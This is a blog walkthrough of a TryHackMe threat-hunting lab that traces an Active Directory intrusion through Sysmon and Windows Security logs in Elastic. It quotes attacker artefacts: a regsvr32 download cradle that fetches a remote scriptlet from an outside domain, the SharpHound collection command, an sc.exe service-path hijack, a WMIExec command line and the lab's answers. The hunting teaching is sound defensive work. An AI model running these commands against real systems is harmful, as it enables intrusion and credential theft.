---
title: "TryHackMe Threat Hunting Pivoting: Chasing an AD Intrusion"
date: 2026-08-11T13:20:00+05:30
lastmod: 2026-08-11T13:24:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-thpivot/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - SOC Level 2
  - Threat Hunting
  - Active Directory
  - DCSync

draft: false
description: "Walkthrough of TryHackMe Threat Hunting Pivoting: hunting discovery, service-based privilege escalation, DCSync, and Pass-the-Hash lateral movement in Elastic."
---

## Threat Hunting: Pivoting

Where Foothold covered getting in, Pivoting is about what an attacker does once inside a Windows domain: enumerate it, escalate, steal credentials, and hop from host to host. The lab is another Elastic Stack, this time heavy on Sysmon and Windows Security logs, and the four tactic tasks (Discovery, Privilege Escalation, Credential Access, Lateral Movement) trace one continuous pivot across DC01 and the workstations.

![The Threat Hunting Pivoting room on TryHackMe marked Room completed 100 percent, all seven tasks green](/img/thm-thpivot/01-room.png)

## Task 3: discovery

Discovery is all in winlogbeat's Sysmon process-creation events (EID 1). Filtering enumeration binaries on DC01 shows the account **backupadm** running host reconnaissance, the first sign an attacker is mapping the domain. On WKSTN-2, a renamed port scanner `n.exe` is launched, and its parent process is **powershell.exe**. The loudest discovery step is BloodHound: SharpHound runs with

```text
"C:\Users\bill.hawkins\Documents\sharp\SharpHound.exe" -c all
```

collecting every AD relationship it can reach with `-c all`.

![Terminal card of the discovery and privilege-escalation activity: SharpHound collection and the sc.exe service ImagePath hijack](/img/thm-thpivot/02-disco-privesc.png)

## Task 4: privilege escalation

Escalation abuses Windows services. First, `spoofer.exe` spawns a Squiblydoo download cradle, **`regsvr32 /s /n /u /i:http://www.oneedirve.xyz/321c3cf/teams.sct scrobj.dll`**, to pull and run a remote scriptlet. The real privilege gain comes from rewriting a service's binary path: `sc.exe config` is used to point a service's `binPath=` at `C:\Users\bill.hawkins\Documents\update.exe`, so restarting the service runs the attacker's binary as SYSTEM. Two services are abused this way, SNMPTRAP and, the room's answer, **Spooler**. The `update.exe` implant has **MD5 `0be0cd5d0f361be812e4eec615b9b5c4`**, pulled straight from the Sysmon process hash.

{{< ad >}}

## Task 5: credential access

With elevated rights the attacker goes after credentials. LSASS is dumped to disk: the process that creates `lsass.DMP` is **Taskmgr.exe**, the classic right-click "Create dump file" trick that avoids dropping a tool. Then comes the domain-wide theft, a **DCSync**. Windows Security EID 4662 with AccessMask `0x100` and the directory-replication property GUIDs catches it, and the one **GUID seen in the logs is `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`** (DS-Replication-Get-Changes), run by backupadm against DC01. Following the remote logons, **jade.burke** arrives on WKSTN-1 and their first process is **wsmprovhost.exe**, the WinRM/PowerShell-remoting host, a telltale sign of remote execution.

![Terminal card of the credential-access and lateral-movement activity: lsass dump, DCSync GUID, Pass-the-Hash logons, and WMIExec](/img/thm-thpivot/03-creds-lateral.png)

## Task 6: lateral movement

The final tactic is the pivot itself. WMIExec activity shows up as children of `WmiPrvSE.exe`, and besides clifford.miller the other account abusing it is **jade.burke**. Pass-the-Hash is hunted with EID 4624, LogonType 3, LogonProcessName `NtLmSsp`, and KeyLength 0; excluding the ANONYMOUS LOGON false positive, that query returns **10** events across the two compromised accounts. The WMIExec command pattern is unmistakable, `cmd.exe /Q /c` piping output to a randomly named file on `ADMIN$`, and after the setup `cd` commands the first real command executed is:

```text
cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1688924047.711874 2>&1
```

![Card summarising every answer across the four tactic tasks](/img/thm-thpivot/04-answers.png)

## Room summary

| | |
|---|---|
| Room | Threat Hunting: Pivoting (SOC Level 2, Threat Hunting) |
| Category | Threat Hunting, Medium |
| Task 3 | `backupadm`; `powershell.exe`; `"...\SharpHound.exe" -c all` |
| Task 4 | `regsvr32 /s /n /u /i:http://...teams.sct scrobj.dll`; `Spooler`; `0be0cd5d0f361be812e4eec615b9b5c4` |
| Task 5 | `Taskmgr.exe`; `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`; `wsmprovhost.exe` |
| Task 6 | `jade.burke`; `10`; `cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\... 2>&1` |
| Tool | Elastic Stack (Kibana + KQL) |

## Wrap-up

Pivoting rewards knowing the ATT&CK map, because each answer is a well-known technique with a well-known artefact: SharpHound for discovery, `sc config` ImagePath rewrites for service-based escalation, Taskmgr and DCSync for credential access, and NTLM logons plus WMIExec for lateral movement. The hunt is a chain of pivots through the data, from an enumeration command to the account that ran it, to that account's DCSync, to the hosts it then logged into over NTLM. The discipline the room teaches is turning each technique into its Sysmon or Security event ID and its distinguishing field, the DCSync replication GUID, KeyLength 0 for Pass-the-Hash, the `ADMIN$` redirect for WMIExec, so the attacker's whole path through the domain falls out of a handful of KQL queries.
